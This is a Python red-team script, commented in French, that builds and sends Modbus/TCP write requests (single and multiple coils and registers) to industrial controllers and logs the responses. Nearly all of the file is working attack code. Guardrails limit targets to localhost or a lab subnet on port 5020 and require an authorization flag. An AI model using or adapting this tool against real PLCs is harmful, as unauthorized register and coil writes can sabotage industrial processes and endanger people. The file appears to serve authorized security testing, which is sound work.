#!/usr/bin/env python3
"""Injection d'ecriture Modbus/TCP (FC5, FC6, FC15, FC16).

ATTENTION : outil offensif. Toute execution reelle exige :
  * une cible dans 127.0.0.1 ou 10.10.30.0/24 ;
  * le port 5020 ;
  * l'option `--i-have-authorization` (autorisation ecrite du proprietaire) ;
  * un debit limite et un nombre d'operations plafonne.

Exemples :
  # Ecriture d'un registre holding (FC6) sur le simulateur local
  python redteam/modbus_write.py --target 127.0.0.1 --function 6 \
      --address 0 --value 1 --i-have-authorization --authorization-ref "LAB-2026-001"

  # Ecriture de 3 registres (FC16)
  python redteam/modbus_write.py --target 10.10.30.10 --function 16 \
      --address 10 --values 700,701,702 --i-have-authorization

  # Simulation sans envoi (exige quand meme l'autorisation)
  python redteam/modbus_write.py --target 127.0.0.1 --function 6 \
      --address 0 --value 1 --i-have-authorization --dry-run
"""

from __future__ import annotations

import argparse
import json
import socket
import sys
from pathlib import Path
from typing import Sequence

# Permet l'execution directe : python redteam/<script>.py
if __package__ in (None, ""):
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from redteam.cli_common import (
    add_common_args,
    describe_scope,
    fail,
    new_transaction_id,
    print_json,
    session_from_args,
)
from redteam.guardrails import GuardrailError, parse_int_list
from redteam.modbus_proto import (
    WRITE_FUNCTIONS,
    ModbusProtocolError,
    build_request,
    build_write_multiple_pdu,
    build_write_single_pdu,
    parse_response,
)
from redteam.modbus_scapy import (
    SCAPY_AVAILABLE,
    ScapyNotInstalledError,
    build_tcp_packet,
    open_tcp_session,
)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Injection d'ecriture Modbus/TCP - SecuriGlass Red Team. "
            "Outil strictement reserve aux tests autorises."
        ),
        epilog=describe_scope(),
    )
    add_common_args(parser, require_authorization=True)
    parser.add_argument(
        "--function",
        type=int,
        choices=sorted(WRITE_FUNCTIONS),
        default=6,
        help="5 bobine unique, 6 registre unique, 15 bobines multiples, 16 registres multiples.",
    )
    parser.add_argument("--address", type=int, default=0, help="Adresse Modbus de depart (0-65535).")
    parser.add_argument("--value", type=int, default=None, help="Valeur unique pour FC5/FC6.")
    parser.add_argument(
        "--values",
        default=None,
        help="Liste separee par des virgules pour FC15 (bits 0/1) ou FC16 (registres 0-65535).",
    )
    return parser


def _resolve_values(args: argparse.Namespace) -> list[int]:
    if args.function in (5, 6):
        if args.value is None:
            raise GuardrailError("--value est obligatoire pour FC5/FC6")
        if args.values is not None:
            raise GuardrailError("--values est reserve a FC15/FC16")
        return [args.value]
    if args.values is None:
        raise GuardrailError("--values est obligatoire pour FC15/FC16")
    if args.value is not None:
        raise GuardrailError("--value est reserve a FC5/FC6")
    maximum = 1 if args.function == 15 else 65535
    return parse_int_list(args.values, minimum=0, maximum=maximum)


def run(args: argparse.Namespace) -> int:
    # 1. Validation de la forme de la requete (avant toute initialisation).
    values: Sequence[int] = _resolve_values(args)
    if args.function in (5, 6):
        build_write_single_pdu(args.function, args.address, values[0])
    else:
        build_write_multiple_pdu(args.function, args.address, values)

    # 2. Garde-fous : cible, port, debit, autorisation explicite.
    session = session_from_args(
        args,
        tool="modbus_write",
        action="write_registers",
        require_authorization=True,
    )
    try:
        transaction_id = new_transaction_id()
        payload = build_request(
            transaction_id=transaction_id,
            unit_id=args.unit_id,
            function_code=args.function,
            start=args.address,
            values=list(values),
        )
        result: dict = {
            "tool": "modbus_write",
            "target": str(session.target),
            "port": session.port,
            "unit_id": args.unit_id,
            "function": args.function,
            "address": args.address,
            "values": list(values),
            "transaction_id": transaction_id,
            "request_hex": payload.hex(),
            "authorized": True,
            "authorization_ref": session.authorization_ref,
            "dry_run": bool(args.dry_run),
        }

        if args.dry_run:
            if SCAPY_AVAILABLE:
                packet = build_tcp_packet(str(session.target), session.port, payload)
                result["scapy_summary"] = packet.summary()
            result["status"] = "DRY_RUN"
            session.log_result(status="DRY_RUN", request_hex=payload.hex(), values=list(values))
            print_json(result)
            return 0

        session.before_operation(
            f"write FC{args.function} address={args.address} values={list(values)}"
        )
        tcp_session = open_tcp_session(str(session.target), session.port, session.timeout)
        try:
            raw_response = tcp_session.send_payload(payload)
        finally:
            tcp_session.close()

        if not raw_response:
            result["status"] = "NO_RESPONSE"
            session.log_result(status="NO_RESPONSE", request_hex=payload.hex())
            print_json(result)
            return 4

        result["response_hex"] = raw_response.hex()
        result["response"] = parse_response(raw_response)
        result["status"] = "OK"
        session.log_result(
            status="OK",
            request_hex=payload.hex(),
            response_hex=raw_response.hex(),
            decoded=result["response"],
        )
        print_json(result)
        return 0
    finally:
        session.logger.close()


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        return run(args)
    except GuardrailError as exc:
        return fail(str(exc), 2)
    except ScapyNotInstalledError as exc:
        return fail(str(exc), 3)
    except ModbusProtocolError as exc:
        return fail(f"trame Modbus invalide : {exc}", 2)
    except (socket.timeout, TimeoutError):
        return fail("timeout reseau : automate injoignable", 4)
    except OSError as exc:
        return fail(f"erreur reseau : {exc}", 4)


if __name__ == "__main__":
    sys.exit(main())
